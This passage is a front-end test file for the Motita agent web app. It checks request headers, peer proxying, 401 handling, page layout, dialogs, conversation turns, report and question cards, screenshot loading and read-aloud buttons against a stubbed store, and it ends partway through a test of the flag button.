// The app itself: how it builds every request, how it lays the page out from the store (the token
// prompt, the sidebar, the chat or the empty state, the dialogs), how the conversation is drawn
// turn by turn, the image preview and copy buttons, and the entry point that mounts it.
//
// The store is a plain object the test drives (./appStore is replaced), and the components that
// are not part of the shell (sidebar, composer, settings, modals, report card, Markdown...) are
// small stand-ins that record the props the app hands them.
// Run with: node --test web/src/__tests__/cov-shell-app.test.mjs
import test, { mock } from "node:test";
import assert from "node:assert/strict";
import {
  setupDom,
  load,
  stub,
  flush,
  text,
  jsonResponse,
  APP_STORE_STUB,
} from "./cov-shell-helpers.mjs";

setupDom("http://localhost/");

// ── Stand-ins ────────────────────────────────────────────────────────────────

// Every stand-in records the props of each render under its name, and draws a marked element.
globalThis.covShellProps = {};
const recordSrc = `
import { h } from "preact";
const rec = (name, props) => {
  (globalThis.covShellProps[name] ||= []).push(props);
};
const mark = (name, props, children) => {
  rec(name, props);
  return h("div", { "data-stub": name }, children);
};
`;
const component = (spec, names, extra = "") =>
  stub(
    spec,
    recordSrc +
      names
        .map(
          (n) => `export function ${n}(props) { return mark("${n}", props); }`,
        )
        .join("\n") +
      "\n" +
      extra,
  );

stub("./appStore", APP_STORE_STUB);
component("./Sidebar", ["Sidebar"]);
component("./Composer", ["Composer"]);
component("./Settings", ["SettingsModal"]);
component("./GitConnect", ["GitConnectModal"]);
component("./FolderBrowser", ["FolderBrowser"]);
component("./EditProjectModal", ["EditProjectModal"]);
component("./NewProjectModal", ["NewProjectModal"]);
component("./RepoGitPanel", ["RepoGitPanel"]);
component("./ModelSwitcherModal", ["ModelSwitcherModal"]);
component("./ConfirmDeleteModal", ["ConfirmDeleteModal", "ContextMenu"]);
component("./Subtitles", ["Subtitles"]);
component("./ProjectHintCard", ["ProjectHintCard"]);
component("./UpgradeModal", ["UpgradeModal"]);
component("./SkillLibraryModal", ["SkillLibraryModal"]);
component("./ArtifactsModal", ["ArtifactsModal"]);
component("./MemoryModal", ["MemoryModal"]);
component("./ScheduledTasksModal", ["ScheduledTasksModal"]);
component("./Lightbox", ["Lightbox"]);
component("./Report", ["ReportCard"]);
component("./QuestionsCard", ["QuestionsCard"]);
component(
  "./PullRequestBar",
  ["PRBar"],
  `export function usePullRequest(store, api) {
    rec("usePullRequest", { store, api });
    return { id: "pr-state" };
  }`,
);
component(
  "./Markdown",
  [],
  `export function Markdown(props) { return mark("Markdown", props, props.content); }`,
);
component(
  "./ConversationParts",
  ["ChangesCard", "RunArtifacts", "SubagentsStrip"],
  `export function UserText(props) { return mark("UserText", props, props.m.text); }
  // TurnTop draws its two parts as their own stubs, so a turn reads as before: the input, then its steps.
  export function TurnTop(props) {
    return h("div", null, props.head && mark("TurnHead", props, props.head.text),
      props.steps.length > 0 && mark("Trail", props, props.steps.map((s) => s.text).join("|")));
  }
  export function ActivityLine(props) { return mark("ActivityLine", props, props.activity); }`,
);
// The computers: the shown one and the list, set by the test through globals.
stub(
  "./useMachines",
  `import { createContext } from "preact";
  import { useState } from "preact/hooks";
  export const MachinesCtx = createContext(null);
  export function useMachineChoice() {
    const [id, set] = useState(globalThis.covShellMachine || "");
    globalThis.covShellSetMachine = set;
    return [id, set];
  }
  export function useMachines(api, enabled, active, setActive) {
    const m = { connecting: null, ...(globalThis.covShellMachines || {}), api, enabled, active, setActive };
    (globalThis.covShellProps.useMachines ||= []).push(m);
    return m;
  }`,
);
component("./ConnectMachineModal", ["ConnectMachineModal"]);
stub(
  "./viewport",
  `export function useVisualViewport() { (globalThis.covShellProps.viewport ||= []).push(1); }`,
);

const { default: App } = await load("App.tsx");
const { h, render } = await import("preact");
const { useState } = await import("preact/hooks");
const { act } = await import("preact/test-utils");

const props = (name) => globalThis.covShellProps[name] || [];
const lastProps = (name) => props(name).at(-1);
const stubEl = (root, name) => root.querySelector(`[data-stub="${name}"]`);

// ── The store ────────────────────────────────────────────────────────────────

const noop = () => {};

// makeStore is a store with everything closed, logging the actions it is asked for.
function makeStore(log) {
  const fn =
    (name) =>
    (...args) =>
      log.push([name, ...args]);
  return {
    api: null,
    rs: {
      sessionId: "s1",
      sessionRef: { current: "s1" },
      noSession: false,
      messages: [],
      running: false,
      activity: null,
      activityKind: "",
      stepsByTurn: {},
      cpInfo: {},
      approval: null,
      approvalSel: 0,
      setApprovalSel: fn("setApprovalSel"),
      approvalRef: { current: null },
      shellLog: [],
      termSeenId: 0,
      liveThought: null,
      agents: [],
      agentOpenId: null,
    },
    status: {
      toast: null,
      toastDetailsOpen: false,
      toggleToastDetails: noop,
      dismissToast: fn("dismissToast"),
      stateText: "ready",
      stateClass: "",
      setToast: fn("setToast"),
    },
    lists: { sidebarOpen: false, openSidebar: fn("openSidebar") },
    scroll: {
      scrollRef: { current: null },
      chatLoading: false,
      modalLeaving: false,
    },
    model: { config: null, showModelSwitcher: false, openModelSwitcher: noop },
    skills: { showSkillLibrary: false },
    repoGit: { open: null },
    projects: {
      editProject: null,
      showNewProject: false,
      folderPicker: null,
      newProjectPath: "",
      pickFolder: fn("pickFolder"),
      closeFolderPicker: fn("closeFolderPicker"),
      gitConnect: null,
      gitRev: 3,
      setGitConnect: fn("setGitConnect"),
      closeGitConnect: fn("closeGitConnect"),
      onGitConnected: fn("onGitConnected"),
    },
    artifacts: {
      showArtifacts: false,
      artifactBase: () => "/v1/sessions/s1/artifacts",
      showRunArtifact: fn("showRunArtifact"),
    },
    memory: { showMemory: false },
    schedules: { showScheduledTasks: false },
    actions: { creatingSession: null, createSession: fn("createSession") },
    deletion: { confirmDelete: null },
    drawers: {
      termOpen: false,
      thinkOpen: false,
      agentsOpen: false,
      agentCopied: null,
      agentNow: 0,
      term: { ref: { current: null }, handlers: {} },
      think: { ref: { current: null }, handlers: {} },
      stickTerm: noop,
      toggleTerm: noop,
      closeTerm: noop,
      toggleThink: noop,
      closeThink: noop,
      toggleAgents: noop,
      closeAgents: noop,
      toggleAgent: noop,
      copyMerge: noop,
      termEntryDone: noop,
    },
    shell: {
      stopAutoApprove: noop,
      answerApproval: fn("answerApproval"),
      onApprovalKey: noop,
    },
    stream: { stopRun: fn("stopRun"), submit: fn("submit") },
    answerSuggestions: fn("answerSuggestions"),
    answerQuestions: fn("answerQuestions"),
    checkpoints: {
      cpMenu: null,
      cpArmed: false,
      setCpMenu: noop,
      setCpArmed: noop,
      toggleCpMenu: noop,
      restoreCheckpoint: noop,
    },
    auth: {
      authState: "ok",
      authInput: "",
      authBusy: false,
      authError: "",
      setAuthInput: noop,
      submitAuth: noop,
    },
    updates: {
      showUpgrade: false,
      updateInfo: null,
      openUpgrade: noop,
      dismissUpgradeToast: noop,
    },
    voice: {
      state: "off",
      hands: false,
      info: null,
      prefs: { wake: false },
      setPrefs: noop,
      setInfo: noop,
    },
    speech: {
      supported: false,
      speakingId: null,
      speak: fn("speak"),
      prefs: { subtitles: true, subtitleSize: "m", conversation: false },
      setPrefs: noop,
      voices: [],
      test: noop,
      device: null,
      gatewayVoices: [],
      allVoices: [],
      local: null,
    },
    language: {
      uiLangSetting: "auto",
      uiLangAvailable: true,
      changeLanguage: async (s) => log.push(["changeLanguage", s]),
    },
    menus: {},
    showSettings: false,
    openSettings: noop,
    closeSettings: fn("closeSettings"),
    selectedSession: undefined,
    isMerged: false,
  };
}

// mountApp draws the real App over a store the test changes with `set`.
async function mountApp(edit = () => {}) {
  globalThis.covShellProps = {};
  const log = [];
  const ctl = { store: makeStore(log), log };
  edit(ctl.store);
  globalThis.covShellUseAppStore = (api) => {
    const [, setN] = useState(0);
    ctl.bump = () => setN((n) => n + 1);
    ctl.store.api = api;
    ctl.api = api;
    return ctl.store;
  };
  const root = document.createElement("div");
  document.body.appendChild(root);
  await act(() => render(h(App, {}), root));
  ctl.root = root;
  ctl.set = async (change) => {
    const next = { ...ctl.store };
    change(next);
    ctl.store = next;
    await act(() => ctl.bump());
  };
  ctl.done = async () => {
    await act(() => render(null, root));
    root.remove();
  };
  return ctl;
}

// ── api ──────────────────────────────────────────────────────────────────────

test("every request carries the page's header and the cookie, and keeps its own options", async () => {
  const ctl = await mountApp();
  const calls = [];
  globalThis.fetch = async (url, init) => {
    calls.push({ url, init });
    return jsonResponse({ ok: 1 });
  };
  const res = await ctl.api("/v1/ui", {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: "{}",
  });
  assert.deepEqual(await res.json(), { ok: 1 });
  const { url, init } = calls[0];
  assert.equal(url, "/v1/ui");
  assert.equal(init.method, "PUT");
  assert.equal(init.credentials, "same-origin");
  assert.equal(init.headers.get("X-Motita"), "1");
  assert.equal(init.headers.get("Content-Type"), "application/json");
  await ctl.api("/v1/sessions");
  assert.equal(
    calls[1].init.headers.get("X-Motita"),
    "1",
    "a request without options too",
  );
  assert.deepEqual(
    lastProps("usePullRequest").api,
    ctl.api,
    "the PR bar gets the same api",
  );
  await ctl.done();
});

test("another computer is reached through this gateway, and its list always from this one", async () => {
  globalThis.covShellMachine = "desk0001";
  globalThis.covShellMachines = { connecting: {} };
  try {
    const ctl = await mountApp();
    const calls = [];
    globalThis.fetch = async (url) => {
      calls.push(url);
      return jsonResponse({});
    };
    await ctl.api("/v1/sessions");
    assert.deepEqual(calls, ["/v1/peers/desk0001/proxy/v1/sessions"]);
    const m = lastProps("useMachines");
    assert.equal(m.active, "desk0001");
    await m.api("/v1/peers");
    assert.equal(calls.at(-1), "/v1/peers", "the computers are this gateway's");
    assert.ok(
      stubEl(ctl.root, "ConnectMachineModal"),
      "the connect dialog is drawn",
    );
    // Showing this computer again starts its page over, talking to it directly.
    await act(() => globalThis.covShellSetMachine(""));
    await ctl.api("/v1/sessions");
    assert.equal(calls.at(-1), "/v1/sessions");
    await ctl.done();
  } finally {
    globalThis.covShellMachine = "";
    globalThis.covShellMachines = null;
  }
});

test("a 401 drops the credential and brings the token prompt back", async () => {
  const ctl = await mountApp();
  const calls = [];
  globalThis.fetch = async (url, init) => {
    calls.push({ url, method: init.method });
    return new Response(null, {
      status: url === "/v1/webui/session" ? 204 : 401,
    });
  };
  let needed = 0;
  const onNeeded = () => needed++;
  window.addEventListener("motita:auth-needed", onNeeded);
  localStorage.setItem("motita:last-session", "s1");
  await assert.rejects(ctl.api("/v1/sessions"), /unauthorised/);
  window.removeEventListener("motita:auth-needed", onNeeded);
  assert.deepEqual(calls, [
    { url: "/v1/sessions", method: undefined },
    { url: "/v1/webui/session", method: "DELETE" },
  ]);
  assert.equal(needed, 1);
  assert.equal(localStorage.getItem("motita:last-session"), null);
  await ctl.done();
});

// ── The page layout ──────────────────────────────────────────────────────────

test("without a credential the token prompt covers the page; the sidebar shows when open", async () => {
  const ctl = await mountApp((s) => {
    s.auth.authState = "needed";
  });
  assert.equal(
    text(ctl.root.querySelector("[data-modal] h2")),
    "Authentication required",
  );
  assert.ok(ctl.root.querySelector("#auth-token"));
  assert.equal(stubEl(ctl.root, "Sidebar"), null);
  assert.ok(props("viewport").length > 0, "the visual viewport is followed");
  await ctl.set((s) => {
    s.auth = { ...s.auth, authState: "ok" };
    s.lists = { ...s.lists, sidebarOpen: true };
  });
  assert.equal(ctl.root.querySelector("#auth-token"), null);
  assert.ok(stubEl(ctl.root, "Sidebar"));
  await ctl.done();
});

test("with a session the chat column has the header, the conversation, the drawers and the composer", async () => {
  const ctl = await mountApp((s) => {
    s.rs.shellLog = [{ id: 1, cmd: "ls", exit: 0, out: "" }];
    s.rs.agents = [
      {
        id: "m",
        purpose: "main",
        state: "running",
        started: "",
        elapsed_ms: 0,
        tokens: { input: 5, output: 1 },
        calls: 0,
      },
    ];
  });
  const { root } = ctl;
  assert.equal(text(root.querySelector("header h1")), "Motita");
  const log = root.querySelector("[role=log]");
  assert.equal(log.getAttribute("aria-label"), "conversation");
  assert.equal(log.getAttribute("data-chat-loading"), "0");
  assert.ok(!log.classList.contains("chat-loading"));
  assert.ok(
    root.querySelector(".term-drawer:not(.is-think):not(.is-agents)"),
    "the terminal",
  );
  assert.ok(root.querySelector(".term-drawer.is-think"), "the thinking");
  assert.ok(root.querySelector(".term-drawer.is-agents"), "the agents");
  assert.ok(stubEl(root, "Composer"));
  assert.deepEqual(lastProps("PRBar").pr, { id: "pr-state" });
  assert.deepEqual(
    { on: lastProps("Subtitles").on, size: lastProps("Subtitles").size },
    { on: true, size: "m" },
  );
  assert.equal(root.querySelector(".chat-modal-scrim"), null);
  assert.equal(root.querySelector(".approval-panel"), null);
  assert.equal(root.querySelector("[data-no-session]"), null);
  assert.ok(stubEl(root, "ContextMenu"), "the long-press menu is always there");
  for (const name of [
    "SettingsModal",
    "EditProjectModal",
    "NewProjectModal",
    "FolderBrowser",
    "GitConnectModal",
    "ModelSwitcherModal",
    "ConfirmDeleteModal",
    "UpgradeModal",
    "SkillLibraryModal",
    "ArtifactsModal",
    "ScheduledTasksModal",
    "Lightbox",
  ]) {
    assert.equal(stubEl(root, name), null, `${name} is closed`);
  }
  assert.equal(root.querySelector(".toast-card"), null);
  await ctl.done();
});

test("while a session loads the modal shows, and a waiting command brings the approval panel", async () => {
  const ctl = await mountApp((s) => {
    s.scroll.chatLoading = true;
    s.rs.approval = {
      id: "ap",
      question: "Delete the build dir?",
      command: "rm -rf build",
    };
  });
  const { root } = ctl;
  const log = root.querySelector("[role=log]");
  assert.ok(log.classList.contains("chat-loading"));
  assert.equal(log.getAttribute("data-chat-loading"), "1");
  assert.equal(
    text(root.querySelector(".chat-modal-label")),
    "Loading session",
  );
  assert.equal(
    text(root.querySelector(".approval-panel h2")),
    "Delete the build dir?",
  );
  root.querySelector(".approval-panel button").click();
  assert.deepEqual(ctl.log.at(-1), ["answerApproval", "ap", true]);
  await ctl.done();
});

test("with no session the chat waits for one, and the button creates it", async () => {
  const ctl = await mountApp((s) => {
    s.rs.noSession = true;
  });
  const { root } = ctl;
  const main = root.querySelector("[data-no-session]");
  assert.match(text(main), /Waiting for a new session/);
  assert.match(text(main), /Type below to start talking to the agent/);
  assert.equal(root.querySelector("[role=log]"), null);
  assert.ok(stubEl(root, "Composer"), "typing is the other way to start");
  assert.ok(root.querySelector("header"), "the header stays");
  const btn = main.querySelector("button");
  assert.equal(text(btn), "New session");
  assert.equal(btn.disabled, false);
  btn.click();
  assert.deepEqual(
    ctl.log.at(-1),
    ["createSession"],
    "called without an event",
  );
  await ctl.set((s) => {
    s.actions = { ...s.actions, creatingSession: "" };
  });
  assert.equal(main.querySelector("button").disabled, true);
  assert.ok(main.querySelector(".btn-spinner"));
  await ctl.done();
});

test("the settings dialog is wired to the language, the voice, the speech and the git hosts", async () => {
  const ctl = await mountApp((s) => {
    s.showSettings = true;
    s.voice = {
      ...s.voice,
      state: "ready",
      info: { wake_phrases: ["hey motita"] },
    };
  });
  const p = lastProps("SettingsModal");
  assert.equal(p.langSetting, "auto");
  assert.equal(p.langAvailable, true);
  assert.deepEqual(p.voice.phrases, ["hey motita"]);
  assert.equal(p.speech.canListen, true);
  assert.equal(p.security.sessionId, "s1");
  for (const part of [
    p.voice,
    p.speech,
    p.llm,
    p.security,
    p.network,
    p.push,
    p.friction,
    p.git,
  ]) {
    assert.equal(part.api, ctl.api);
  }
  assert.equal(p.git.rev, 3);
  p.onLang("es");
  p.onClose();
  p.llm.onNotice("Model saved", false);
  p.llm.onNotice("Model failed", true);
  p.git.onConnect("github", undefined);
  p.git.onNotice("Disconnected", false);
  p.git.onNotice("Could not disconnect", true);
  await flush();
  assert.deepEqual(ctl.log, [
    ["changeLanguage", "es"],
    ["closeSettings"],
    ["setToast", { message: "Model saved", type: "success" }],
    ["setToast", { message: "Model failed", type: "error" }],
    ["setGitConnect", { service: "github", selfHosted: undefined }],
    ["setToast", { message: "Disconnected", type: "success" }],
    ["setToast", { message: "Could not disconnect", type: "error" }],
  ]);
  await ctl.set((s) => {
    s.voice = { ...s.voice, state: "off", info: null };
  });
  assert.deepEqual(
    lastProps("SettingsModal").voice.phrases,
    [],
    "no voice info, no phrases",
  );
  assert.equal(lastProps("SettingsModal").speech.canListen, false);
  await ctl.done();
});

test("the project dialogs open from the store", async () => {
  const ctl = await mountApp((s) => {
    s.projects.editProject = { id: "p1", title: "Motita" };
    s.projects.showNewProject = true;
    s.projects.gitConnect = {
      service: "gitlab",
      selfHosted: { url: "https://git.example" },
    };
  });
  const { root } = ctl;
  assert.deepEqual(lastProps("EditProjectModal").p, {
    id: "p1",
    title: "Motita",
  });
  assert.ok(stubEl(root, "NewProjectModal"));
  const gc = lastProps("GitConnectModal");
  assert.equal(gc.service, "gitlab");
  assert.deepEqual(gc.selfHosted, { url: "https://git.example" });
  gc.onClose();
  gc.onConnected();
  assert.deepEqual(
    ctl.log.map((e) => e[0]),
    ["closeGitConnect", "onGitConnected"],
  );
  await ctl.done();
});

test("the git panel of a repository opens from the store", async () => {
  const ctl = await mountApp((s) => {
    s.repoGit.open = { projectId: "p1", repo: "api" };
  });
  assert.ok(stubEl(ctl.root, "RepoGitPanel"));
  assert.deepEqual(lastProps("RepoGitPanel").r, {
    projectId: "p1",
    repo: "api",
  });
  await ctl.done();
});

test("the folder browser opens on the folder of the dialog that asked for it", async () => {
  const ctl = await mountApp((s) => {
    s.projects.folderPicker = "new";
    s.projects.newProjectPath = "/srv/app";
  });
  const { root } = ctl;
  assert.ok(stubEl(root, "FolderBrowser"));
  assert.equal(lastProps("FolderBrowser").start, "/srv/app");
  assert.equal(lastProps("FolderBrowser").api, ctl.api);
  lastProps("FolderBrowser").onPick("/srv/app");
  lastProps("FolderBrowser").onClose();
  assert.deepEqual(
    ctl.log.map((e) => e[0]),
    ["pickFolder", "closeFolderPicker"],
  );
  await ctl.set((s) => {
    s.projects = {
      ...s.projects,
      folderPicker: "edit",
      editProject: { id: "p1", dir: "/ws/a", path: "/mnt/b" },
    };
  });
  assert.equal(lastProps("FolderBrowser").start, "/mnt/b");
  await ctl.set((s) => {
    s.projects = {
      ...s.projects,
      editProject: { id: "p1", dir: "/ws/a", path: "" },
    };
  });
  assert.equal(lastProps("FolderBrowser").start, "/ws/a");
  await ctl.done();
});

test("the dialogs, the toast and the libraries open from the store", async () => {
  const ctl = await mountApp((s) => {
    s.model.showModelSwitcher = true;
    s.deletion.confirmDelete = { type: "session", id: "s9", title: "Old" };
    s.updates.showUpgrade = true;
    s.status.toast = { message: "Saved", type: "success" };
    s.skills.showSkillLibrary = true;
    s.artifacts.showArtifacts = true;
    s.memory.showMemory = true;
    s.schedules.showScheduledTasks = true;
  });
  const { root } = ctl;
  for (const name of [
    "ModelSwitcherModal",
    "UpgradeModal",
    "SkillLibraryModal",
    "ArtifactsModal",
    "MemoryModal",
    "ScheduledTasksModal",
  ]) {
    assert.ok(stubEl(root, name), `${name} is open`);
  }
  assert.deepEqual(lastProps("ConfirmDeleteModal").target, {
    type: "session",
    id: "s9",
    title: "Old",
  });
  const card = root.querySelector(".toast-card");
  assert.equal(text(card.querySelector("p")), "Saved");
  // A different toast is a new card.
  await ctl.set((s) => {
    s.status = { ...s.status, toast: { message: "Failed", type: "error" } };
  });
  const card2 = root.querySelector(".toast-card");
  assert.notEqual(card2, card);
  assert.equal(text(card2.querySelector("p")), "Failed");
  card2.querySelector("[aria-label='Dismiss']").click();
  assert.deepEqual(ctl.log.at(-1), ["dismissToast"]);
  await ctl.done();
});

// ── The conversation ─────────────────────────────────────────────────────────

const msg = (id, role, text, over = {}) => ({ id, role, text, ...over });

test("the conversation is one turn per input, with its steps, its answer and the live activity", async () => {
  const ctl = await mountApp((s) => {
    s.rs.running = true;
    s.rs.activity = "running tests";
    s.rs.messages = [
      msg(1, "agent", "Welcome back"),
      msg(2, "user", "Fix the build", { turn: 1 }),
      msg(3, "agent", "Done, the build is green.", {
        changes: { files: [] },
        artifacts: [{ name: "a.log", type: "text/plain", size: 3 }],
      }),
      msg(4, "user", "And the tests?", { turn: 2 }),
      msg(5, "activity", "agents: 2 running", { kind: "agents" }),
    ];
    s.rs.stepsByTurn = {
      1: [
        { kind: "step", text: "ran make" },
        { kind: "thought", text: "thinking: hmm" },
      ],
      2: [
        { kind: "step", text: "mode: plan (asked for a plan)" },
        { kind: "step", text: "ran go test" },
      ],
    };
  });
  const { root } = ctl;
  const turns = [...root.querySelectorAll(".turn")];
  assert.equal(
    turns.length,
    3,
    "a group before the first input, then one per input",
  );
  // The first group has no input: its agent line is drawn as a message.
  assert.equal(stubEl(turns[0], "TurnHead"), null);
  assert.equal(text(turns[0].querySelector(".msg.agent")), "Welcome back");
  // The first input's turn: the head, the steps without thoughts, the answer.
  assert.equal(text(stubEl(turns[1], "TurnHead")), "Fix the build");
  assert.equal(
    text(stubEl(turns[1], "Trail")),
    "ran make",
    "thoughts live in the drawer",
  );
  const answer = turns[1].querySelector(".msg.agent");
  assert.equal(answer.getAttribute("data-who"), "Agent");
  assert.equal(answer.getAttribute("data-msg-id"), "3");
  assert.equal(text(stubEl(answer, "Markdown")), "Done, the build is green.");
  assert.ok(stubEl(answer, "ChangesCard"));
  assert.ok(stubEl(answer, "RunArtifacts"));
  assert.equal(
    answer.querySelector(".speak-msg-btn"),
    null,
    "no speech, no read-aloud button",
  );
  // The live turn: its last step is the activity line, not drawn twice.
  const heads = props("TurnHead");
  const liveHead = heads.filter((p) => p.head.id === 4).at(-1);
  assert.equal(liveHead.liveHere, true);
  assert.equal(liveHead.turn, 2);
  assert.equal(
    liveHead.mode,
    "plan",
    "auto mode's pick is read from the first step",
  );
  assert.equal(
    text(stubEl(turns[2], "Trail")),
    "mode: plan (asked for a plan)",
  );
  assert.equal(text(stubEl(turns[2], "ActivityLine")), "running tests");
  assert.equal(lastProps("ActivityLine").shown.length, 2);
  const note = turns[2].querySelector(".msg.activity");
  assert.equal(note.className, "msg activity agents");
  assert.equal(note.getAttribute("data-who"), null);
  assert.equal(text(note), "agents: 2 running");
  await ctl.done();
});

test("an idle turn draws all its steps and no activity; a turn without steps has no trail", async () => {
  const ctl = await mountApp((s) => {
    s.rs.activity = "stale";
    s.rs.messages = [
      msg(1, "user", "Hi", { turn: 1 }),
      msg(2, "user", "Again"),
    ];
    s.rs.stepsByTurn = {
      1: [
        { kind: "step", text: "a" },
        { kind: "step", text: "b" },
      ],
    };
  });
  const turns = [...ctl.root.querySelectorAll(".turn")];
  assert.equal(text(stubEl(turns[0], "Trail")), "a|b");
  assert.equal(stubEl(turns[0], "ActivityLine"), null);
  assert.equal(
    stubEl(turns[1], "Trail"),
    null,
    "a turn with no turn number has no steps",
  );
  assert.equal(
    props("TurnHead")
      .filter((p) => p.head.id === 2)
      .at(-1).mode,
    null,
  );
  await ctl.done();
});

test("notes: the empty conversation is a card, a kind note is translated, other notes are as given", async () => {
  const ctl = await mountApp((s) => {
    s.rs.messages = [
      msg(1, "activity", "Nothing yet. Ask for something below.", {
        kind: "kind",
      }),
      msg(2, "activity", "Stopped", { kind: "kind" }),
      msg(3, "activity", "raw progress", { kind: "progress" }),
    ];
  });
  const notes = [...ctl.root.querySelectorAll(".msg")];
  assert.equal(notes[0].className, "msg activity kind empty-note");
  assert.ok(notes[0].querySelector(".empty-note-body svg"));
  assert.equal(text(notes[0]), "Nothing yet. Ask for something below.");
  assert.equal(notes[1].className, "msg activity kind");
  assert.equal(text(notes[1]), "Stopped");
  assert.equal(notes[2].className, "msg activity progress");
  assert.equal(text(notes[2]), "raw progress");
  await ctl.done();
});

test("an answer that asked is a questions card, answerable only while idle and while current", async () => {
  const questions = [{ text: "which?", options: ["a", "b"] }];
  const qa = { answers: ["a"], request: "r" };
  const ctl = await mountApp((s) => {
    s.rs.messages = [
      msg(1, "user", "Do it", { turn: 1 }),
      msg(2, "agent", "which?", { questions, origin: "Do it" }),
      msg(3, "agent", "which?", { questions }),
      msg(4, "user", "Next", { turn: 2 }),
      msg(5, "agent", "which?", { questions, questionAnswers: qa }),
      msg(6, "agent", "which?", { questions, origin: "Next" }),
    ];
  });
  const cards = props("QuestionsCard");
  const stale = cards.find((c) => c.expired && c.origin === "Do it");
  assert.ok(
    stale,
    "unanswered questions older than the last input are expired",
  );
  assert.ok(
    cards.some((c) => c.expired && c.origin === ""),
    "a missing origin is empty",
  );
  assert.equal(
    cards.find((c) => c.answers === qa).expired,
    false,
    "answered ones never expire",
  );
  const current = cards.filter((c) => c.origin === "Next").at(-1);
  assert.equal(current.expired, false);
  assert.equal(current.items, questions);
  current.onAnswer(qa, "a");
  assert.deepEqual(ctl.log.at(-1), [
    "answerQuestions",
    ctl.store.rs.messages[5],
    qa,
    "a",
  ]);
  await ctl.set((s) => {
    s.rs = { ...s.rs, running: true };
  });
  assert.equal(
    props("QuestionsCard").at(-1).onAnswer,
    undefined,
    "answering is a turn: not while one runs",
  );
  await ctl.done();
});

test("a report answer is a report card; its suggestions are answerable only while idle and while current", async () => {
  const report = { summary: "done" };
  const ctl = await mountApp((s) => {
    s.rs.messages = [
      msg(1, "user", "Do it", { turn: 1 }),
      msg(2, "agent", "", { report }),
      msg(3, "agent", "", { report, answers: { a: true } }),
      msg(4, "user", "Next", { turn: 2 }),
      msg(5, "agent", "", { report }),
    ];
    s.rs.stepsByTurn = { 2: [{ kind: "step", text: "mode: task (auto)" }] };
  });
  const cards = props("ReportCard");
  const byAnswers = (answers, expired) =>
    cards.filter((c) => c.answers === answers && c.expired === expired).at(-1);
  const stale = byAnswers(undefined, true);
  assert.ok(stale, "an unanswered report older than the last input is expired");
  assert.equal(stale.auto, false);
  assert.equal(
    byAnswers(cards.find((c) => c.answers)?.answers, false).expired,
    false,
    "an answered one never expires",
  );
  const current = cards.filter((c) => c.expired === false && !c.answers).at(-1);
  assert.equal(current.auto, true, "the turn went through auto mode");
  assert.equal(current.report, report);
  assert.equal(typeof current.onAnswer, "function");
  current.onAnswer({ x: 1 });
  assert.deepEqual(ctl.log.at(-1), [
    "answerSuggestions",
    ctl.store.rs.messages[4],
    { x: 1 },
  ]);

  await ctl.set((s) => {
    s.rs = { ...s.rs, running: true };
  });
  const whileRunning = props("ReportCard").at(-1);
  assert.equal(
    whileRunning.onAnswer,
    undefined,
    "applying suggestions is a turn: not while one runs",
  );
  await ctl.done();
});

test("screenshots a report names are fetched once from the session's artifacts", async () => {
  const ctl = await mountApp((s) => {
    s.rs.messages = [msg(1, "agent", "", { report: { summary: "x" } })];
  });
  const fetched = [];
  globalThis.fetch = async (url) => {
    fetched.push(url);
    if (url.endsWith("/missing.png")) {
      return new Response(null, { status: 404 });
    }
    if (url.endsWith("/offline.png")) {
      throw new TypeError("offline");
    }
    return new Response(new Blob(["png"]), { status: 200 });
  };
  const made = [];
  URL.createObjectURL = (blob) => {
    made.push(blob);
    return "blob:shot-" + made.length;
  };
  const loadImage = lastProps("ReportCard").loadImage;
  const [a, b] = await Promise.all([
    loadImage("my shot.png"),
    loadImage("my shot.png"),
  ]);
  assert.equal(a, "blob:shot-1");
  assert.equal(b, "blob:shot-1");
  assert.deepEqual(
    fetched,
    ["/v1/sessions/s1/artifacts/my%20shot.png"],
    "fetched once",
  );
  assert.equal(await loadImage("missing.png"), null);
  assert.equal(await loadImage("offline.png"), null);
  assert.equal(fetched.length, 3);
  // Another session lets go of the screenshots of the one before, and fetches its own.
  const revoked = [];
  const savedRevoke = URL.revokeObjectURL;
  URL.revokeObjectURL = (u) => revoked.push(u);
  try {
    await ctl.set((s) => {
      s.rs = { ...s.rs, sessionId: "s2" };
    });
    await flush();
    assert.deepEqual(revoked, ["blob:shot-1"]);
    assert.equal(
      await lastProps("ReportCard").loadImage("my shot.png"),
      "blob:shot-2",
    );
    assert.equal(fetched.length, 4);
    await ctl.done();
    await flush();
    assert.deepEqual(
      revoked,
      ["blob:shot-1", "blob:shot-2"],
      "the page leaves",
    );
  } finally {
    URL.revokeObjectURL = savedRevoke;
  }
});

test("an answer can be read aloud, or stopped while it is the one being read", async () => {
  const ctl = await mountApp((s) => {
    s.speech.supported = true;
    s.rs.messages = [
      msg(1, "user", "Hi", { turn: 1 }),
      msg(2, "agent", "Hello there"),
      msg(3, "agent", "draft", { draft: true }),
      msg(4, "agent", "Streaming…"),
    ];
  });
  const { root } = ctl;
  const btns = () => [...root.querySelectorAll(".speak-msg-btn")];
  assert.equal(btns().length, 2, "not on a draft");
  const [first] = btns();
  assert.equal(first.getAttribute("aria-label"), "Read aloud");
  assert.equal(first.getAttribute("aria-pressed"), "false");
  assert.equal(first.title, "Read aloud (Alt+L)");
  assert.equal(first.querySelectorAll("path").length, 3, "the speaker");
  first.click();
  assert.deepEqual(ctl.log.at(-1), ["speak", ctl.store.rs.messages[1]]);

  await ctl.set((s) => {
    s.speech = { ...s.speech, speakingId: 2 };
    s.rs = { ...s.rs, running: true };
  });
  assert.equal(
    btns().length,
    1,
    "the answer still streaming has no button yet",
  );
  const reading = btns()[0];
  assert.equal(reading.className, "speak-msg-btn is-reading");
  assert.equal(reading.getAttribute("aria-label"), "Stop reading");
  assert.equal(reading.getAttribute("aria-pressed"), "true");
  assert.ok(reading.querySelector("rect"), "the stop square");
  await ctl.done();
});

test("an answer can be marked as not right, with words or without, and says when it could not", async () => {
  const ctl = await mountApp((s) => {
    s.rs.messages = [
      msg(1, "user", "Hi", { turn: 4 }),
      msg(2, "agent", "Wrong answer", { turn: 4 }),
      msg(3, "agent", "No turn yet"),
      msg(4, "agent", "Streaming…", { turn: 5 }),
    ];
  });
  const { root } = ctl;
  const btns = () => [...root.querySelectorAll(".flag-msg-btn")];
  assert.equal(btns().length, 2, "not on an answer without a turn");
  const calls = [];
  let status = 204;
  let release;
  globalThis.fetch = async (url, init) => {
    calls.push({ url, body: JSON.parse(init.body) });
    if (release) {
      await new Promise((r) => (release = r));
    }
    return new Response(status === 204 ? null : '{"error":"gone"}', { status });
  };

  // Opening and closing the form.
  const [first] = btns();
  assert.equal(first.getAttribute("aria-label"), "This was not right");
